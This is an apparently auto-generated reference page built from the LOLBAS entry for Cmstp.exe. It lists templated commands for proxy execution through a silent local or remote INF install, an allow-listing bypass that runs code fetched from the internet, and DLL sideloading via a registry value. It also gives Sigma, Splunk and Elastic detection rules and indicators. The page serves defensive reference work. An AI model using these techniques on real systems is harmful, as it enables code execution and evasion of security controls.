---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Cmstp.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `cmstp.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Cmstp.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Cmstp.exe](../../tools/windows/cmstp.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | cmstp.exe |
| name | Cmstp.exe |
| type | tool |
| source | lolbas |
| url | https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@oddvarmoe'
  Person: Oddvar Moe
- Handle: '@NickTyrer'
  Person: Nick Tyrer
- Handle: '@ghosts621'
  Person: Naor Evgi
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}
  Description: Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains
    a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.
  MitreID: T1218.003
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: INF
  Usecase: Execute code hidden within an inf file. Download and run scriptlets from internet.
- Category: AWL Bypass
  Command: cmstp.exe /ni /s {REMOTEURL:.inf}
  Description: Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains
    a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.
  MitreID: T1218.003
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  Privileges: User
  Tags:
  - Execute: INF
  - Execute: Remote
  Usecase: Execute code hidden within an inf file. Execute code directly from Internet.
- Category: Execute
  Command: cmstp.exe /nf
  Description: cmstp.exe reads the `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\cmmgr32.exe\CmstpExtensionDll`
    registry value and passes its data directly to `LoadLibrary`. By modifying this registry key and setting it to an attack-controlled
    DLL, this will sideload the DLL via `cmstp.exe`.
  MitreID: T1218.003
  OperatingSystem: Windows 10, Windows 11
  Privileges: Administrator
  Tags:
  - Execute: DLL
  - Requires: Registry Change
  Usecase: Proxy execution of a malicious DLL via registry modification.
Created: 2018-05-25
Description: Installs or removes a Connection Manager service profile.
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_cmstp_execution_by_creation.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_uac_bypass_cmstp.yml
- Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/cmlua_or_cmstplua_uac_bypass.yml
- Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
- IOC: Execution of cmstp.exe without a VPN use case is suspicious
- IOC: DotNet CLR libraries loaded into cmstp.exe
- IOC: DotNet CLR Usage Log - cmstp.exe.log
- IOC: Registry modification to HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\cmmgr32.exe\CmstpExtensionDll
Full_Path:
- Path: C:\Windows\System32\cmstp.exe
- Path: C:\Windows\SysWOW64\cmstp.exe
Name: Cmstp.exe
Resources:
- Link: https://twitter.com/NickTyrer/status/958450014111633408
- Link: https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80
- Link: https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e
- Link: https://oddvar.moe/2017/08/15/research-on-cmstp-exe/
- Link: https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1
- Link: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp
- Link: https://gist.github.com/ghosts621/ea8ad5b8a0904dd40b33f01f0e8285dc
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Cmstp.yml
```

## Detection / Analysis Notes

```text
Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
```

```text
Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
```

```text
IOC: DotNet CLR Usage Log - cmstp.exe.log
```

```text
IOC: DotNet CLR libraries loaded into cmstp.exe
```

```text
IOC: Execution of cmstp.exe without a VPN use case is suspicious
```

```text
IOC: Registry modification to HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\cmmgr32.exe\CmstpExtensionDll
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_cmstp_execution_by_creation.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_uac_bypass_cmstp.yml
```

```text
Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/cmlua_or_cmstplua_uac_bypass.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_cmstp_execution_by_creation.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_uac_bypass_cmstp.yml
- Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/cmlua_or_cmstplua_uac_bypass.yml
- Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
- IOC: Execution of cmstp.exe without a VPN use case is suspicious
- IOC: DotNet CLR libraries loaded into cmstp.exe
- IOC: DotNet CLR Usage Log - cmstp.exe.log
- IOC: Registry modification to HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\cmmgr32.exe\CmstpExtensionDll
```
